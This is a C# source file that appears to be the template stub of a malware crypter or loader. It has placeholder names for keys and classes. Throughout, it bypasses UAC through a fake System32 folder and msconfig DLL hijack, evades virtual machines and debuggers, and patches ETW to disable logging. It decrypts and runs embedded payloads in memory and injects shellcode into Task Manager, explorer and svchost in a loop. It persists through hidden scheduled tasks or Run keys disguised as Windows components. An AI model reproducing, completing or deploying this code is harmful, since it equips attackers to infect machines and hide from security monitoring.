﻿using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Text;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Management;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Threading;
using Microsoft.Win32;

namespace namespace_name
{
    internal class class_name
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

#if ANTI_DEBUG
        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
#endif

#if NATIVE
        private delegate void NativeEntryPointDelegate();
#endif

        private static uint PAGE_EXECUTE_READWRITE = 0x40;

        static void Main(string[] args)
        {
            string currentfilename = Process.GetCurrentProcess().MainModule.FileName;

#if UAC_BYPASS
            Version osversion = Environment.OSVersion.Version;
            if ((osversion.Major >= 6 && osversion.Minor >= 1) || osversion.Major >= 10)
            {
                try
                {
                    if (!IsAdmin())
                    {
                        Directory.CreateDirectory("\\\\?\\C:\\Windows \\System32");
                        File.Copy("C:\\Windows\\System32\\msconfig.exe", "C:\\Windows \\System32\\msconfig.exe", true);
                        File.WriteAllBytes("C:\\Windows \\System32\\version.dll", uncompressfunction_name(getembeddedresourcefunction_name(@"UAC")));
                        Environment.SetEnvironmentVariable(@"phantombp", Console.Title, EnvironmentVariableTarget.User);
                        Process.Start(new ProcessStartInfo()
                        {
                            FileName = "C:\\Windows \\System32\\msconfig.exe",
                            Arguments = "",
                            UseShellExecute = true,
                            WindowStyle = ProcessWindowStyle.Hidden
                        });
                        try
                        {
                            Thread.Sleep(3000);
                            Environment.SetEnvironmentVariable(@"phantombp", null, EnvironmentVariableTarget.User);
                        }
                        catch
                        {
                        }
                        Environment.Exit(-1);
                    }
                    else
                    {
                        try
                        {
                            Environment.SetEnvironmentVariable(@"phantombp", null, EnvironmentVariableTarget.User);
                            Directory.Delete("\\\\?\\C:\\Windows ", true);
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            }
#endif

#if STARTUP
            try
            {
                bool isStartup = IsStartup(Console.Title);
                if (!isStartup)
                {
                    InstallStartup(Console.Title);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                Process.GetCurrentProcess().Kill();
            }
#endif

#if FILELESS_ROOTKIT
            if (IsAdmin())
            {
                Thread rootkit_thread = new Thread(RootkitInjector);
                rootkit_thread.SetApartmentState(ApartmentState.STA);
                rootkit_thread.IsBackground = true;
                rootkit_thread.Start();
            }
#endif

#if ANTI_VM
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"Select * from Win32_ComputerSystem");
            ManagementObjectCollection instances = searcher.Get();
            foreach (ManagementBaseObject inst in instances)
            {
                string manufacturer = inst[@"Manufacturer"].ToString().ToLower();
                if ((manufacturer == @"microsoft corporation" && inst[@"Model"].ToString().ToUpperInvariant().Contains(@"VIRTUAL")) || manufacturer.Contains(@"vmware") || inst[@"Model"].ToString() == @"VirtualBox")
                {
                    Environment.Exit(1);
                }
            }
            searcher.Dispose();
#endif

#if ANTI_DEBUG
            bool remotedebug = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remotedebug);
            if (Debugger.IsAttached || remotedebug || IsDebuggerPresent())
            {
                Environment.Exit(-1);
            }
#endif

            IntPtr ntdll = LoadLibrary(@"ntdll.dll");
            IntPtr etwaddr = GetProcAddress(ntdll, @"EtwEventWrite");
            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
            uint oldProtect;
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(Patch, 0, etwaddr, Patch.Length);
            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, oldProtect, out oldProtect);

            string payloadstr = @"payload.exe";
            string unhookerstr = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookertxt_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));

            Assembly unhookerasm = Assembly.Load(uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(unhookerstr), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str"))));
            string unhookerclass = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerclass_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            string unhookerfunction = Encoding.UTF8.GetString(aesfunction_name(Convert.FromBase64String("unhookerfunction_str"), Convert.FromBase64String("key_str"), Convert.FromBase64String("iv_str")));
            unhookerasm.GetType(unhookerclass).GetMethod(unhookerfunction).Invoke(null, null);

            Assembly asm = Assembly.GetExecutingAssembly();
            foreach (string name in asm.GetManifestResourceNames())
            {
                if (name == payloadstr || name == @"UAC")
                {
                    continue;
                }
                if (name.EndsWith(@".exe") || name.EndsWith(@".bat"))
                {
                    try
                    {
                        File.WriteAllBytes(name, getembeddedresourcefunction_name(name));
                        File.SetAttributes(name, FileAttributes.Hidden | FileAttributes.System);
                        new Thread(() =>
                        {
                            Process.Start(name).WaitForExit();
                            File.SetAttributes(name, FileAttributes.Normal);
                            File.Delete(name);
                        }).Start();
                    }
                    catch
                    {
                    }
                }
            }

            byte[] payload = uncompressfunction_name(aesfunction_name(getembeddedresourcefunction_name(payloadstr), Convert.FromBase64String(@"key_str"), Convert.FromBase64String(@"iv_str")));
            string[] targs = new string[] { };
            try
            {
                targs = args[0].Split(' ');
            }
            catch
            {
            }

#if NATIVE
            unsafe
            {
                fixed (byte* _pointer = payload)
                {
                    IntPtr _mem = (IntPtr)_pointer;
                    VirtualProtect(_mem, (UIntPtr)payload.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
                    NativeEntryPointDelegate NativeExecute = (NativeEntryPointDelegate)Marshal.GetDelegateForFunctionPointer(_mem, typeof(NativeEntryPointDelegate));
                    NativeExecute();
                    Environment.Exit(-1);
                }
            }
#else
            MethodInfo entry = Assembly.Load(payload).EntryPoint;
            try { entry.Invoke(null, new object[] { targs }); }
            catch { entry.Invoke(null, null); }
#endif
        }

#if FILELESS_ROOTKIT
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        private static List<int> alreadyInjectedPIDs = new List<int>();

        private static void RootkitInjector()
        {
            byte[] shellcode = uncompressfunction_name(getembeddedresourcefunction_name(@"Stager"));
            while (true)
            {
                try
                {
                    Process[] taskmanagerProcesses = Process.GetProcessesByName(@"Taskmgr");
                    Process[] explorerProcesses = Process.GetProcessesByName(@"explorer");
                    Process[] svchostProcesses = Process.GetProcessesByName(@"svchost");
                    foreach (Process taskmanagerProcess in taskmanagerProcesses)
                    {
                        try
                        {
                            if (alreadyInjectedPIDs.Contains(taskmanagerProcess.Id) == false)
                            {
                                alreadyInjectedPIDs.Add(taskmanagerProcess.Id);
                                IntPtr pAddr = VirtualAllocEx(taskmanagerProcess.Handle, IntPtr.Zero, (UInt32)shellcode.Length, 0x1000 | 0x2000, 0x40);
                                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                                WriteProcessMemory(taskmanagerProcess.Handle, pAddr, shellcode, shellcode.Length, out lpNumberOfBytesWritten);
                                IntPtr hThread = IntPtr.Zero;
                                CreateRemoteThread(taskmanagerProcess.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, 0, out hThread);
                            }
                        }
                        catch
                        {
                        }
                    }
                    foreach (Process explorerProcess in explorerProcesses)
                    {
                        try
                        {
                            if (alreadyInjectedPIDs.Contains(explorerProcess.Id) == false)
                            {
                                alreadyInjectedPIDs.Add(explorerProcess.Id);
                                IntPtr pAddr = VirtualAllocEx(explorerProcess.Handle, IntPtr.Zero, (UInt32)shellcode.Length, 0x1000 | 0x2000, 0x40);
                                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                                WriteProcessMemory(explorerProcess.Handle, pAddr, shellcode, shellcode.Length, out lpNumberOfBytesWritten);
                                IntPtr hThread = IntPtr.Zero;
                                CreateRemoteThread(explorerProcess.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, 0, out hThread);
                            }
                        }
                        catch
                        {
                        }
                    }
                    foreach (Process svchostProcess in svchostProcesses)
                    {
                        try
                        {
                            if (alreadyInjectedPIDs.Contains(svchostProcess.Id) == false)
                            {
                                alreadyInjectedPIDs.Add(svchostProcess.Id);
                                IntPtr pAddr = VirtualAllocEx(svchostProcess.Handle, IntPtr.Zero, (UInt32)shellcode.Length, 0x1000 | 0x2000, 0x40);
                                IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
                                WriteProcessMemory(svchostProcess.Handle, pAddr, shellcode, shellcode.Length, out lpNumberOfBytesWritten);
                                IntPtr hThread = IntPtr.Zero;
                                CreateRemoteThread(svchostProcess.Handle, IntPtr.Zero, 0, pAddr, IntPtr.Zero, 0, out hThread);
                            }
                        }
                        catch
                        {
                        }
                    }
                    taskmanagerProcesses = null;
                    explorerProcesses = null;
                    svchostProcesses = null;
                    Thread.Sleep(500);
                }
                catch
                {
                }
            }
        }
#endif

        private static bool IsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

#if STARTUP
        private static bool IsStartup(string path)
        {
            if (path.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)) == true)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

#if FILELESS_ROOTKIT
        private static void InstallStartup(string batPath)
        {
            string currentfileextension = ".bat";
            string randomvar = new Random().Next(1, 1000).ToString();
            string newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\$phantom-startup_str_" + randomvar + currentfileextension;
            string newVpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\$phantom-startup_str_" + randomvar + @".vbs";
            File.WriteAllText(newVpath, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + newpath + "\"\"\", 0");
            if (IsAdmin())
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "Register-ScheduledTask -TaskName '$phantom-RuntimeBroker_startup_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newVpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            else
            {
                var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("$phantom-RuntimeBroker_startup_" + randomvar + @"_str", "wscript.exe \"" + newVpath + "\"");
                key.Dispose();
            }
            if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;
            File.Copy(batPath, newpath, true);
            Process.Start(newVpath);
            Environment.Exit(-1);
        }
#else
        private static void InstallStartup(string batPath)
        {
            string currentfileextension = ".bat";
            string randomvar = new Random().Next(1, 1000).ToString();
            string newpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Log_" + randomvar + currentfileextension;
            string newVpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Windows_Log_" + randomvar + @".vbs";
            File.WriteAllText(newVpath, "CreateObject(Replace(\"WScript.Shell\",\"SubChar\",\"\")).Run \"\"\"" + newpath + "\"\"\", 0");
            if (IsAdmin())
            {
                Process.Start(new ProcessStartInfo()
                {
                    FileName = "powershell.exe",
                    Arguments = "Register-ScheduledTask -TaskName 'Windows_Log_" + randomvar + "_str' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute '" + newVpath + "') -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden -ExecutionTimeLimit 0) -RunLevel Highest -Force",
                    UseShellExecute = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                }).WaitForExit();
            }
            else
            {
                var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                key.SetValue("Windows_Log_" + randomvar + @"_str", "wscript.exe \"" + newVpath + "\"");
                key.Dispose();
            }
            if (batPath.IndexOf(newpath, StringComparison.OrdinalIgnoreCase) == 0) return;
            File.Copy(batPath, newpath, true);
            Process.Start(newVpath);
            Environment.Exit(-1);
        }
#endif
#endif

        private static byte[] aesfunction_name(byte[] input, byte[] key, byte[] iv)
        {
            AesManaged aes = new AesManaged();
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);
            byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);
            decryptor.Dispose();
            aes.Dispose();
            return decrypted;
        }

        private static byte[] uncompressfunction_name(byte[] bytes)
        {
            MemoryStream msi = new MemoryStream(bytes);
            MemoryStream mso = new MemoryStream();
            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
            gs.CopyTo(mso);
            gs.Dispose();
            mso.Dispose();
            msi.Dispose();
            return mso.ToArray();
        }

        private static byte[] getembeddedresourcefunction_name(string name)
        {
            Assembly asm = Assembly.GetExecutingAssembly();
            MemoryStream ms = new MemoryStream();
            Stream stream = asm.GetManifestResourceStream(name);
            stream.CopyTo(ms);
            stream.Dispose();
            byte[] ret = ms.ToArray();
            ms.Dispose();
            return ret;
        }
    }
}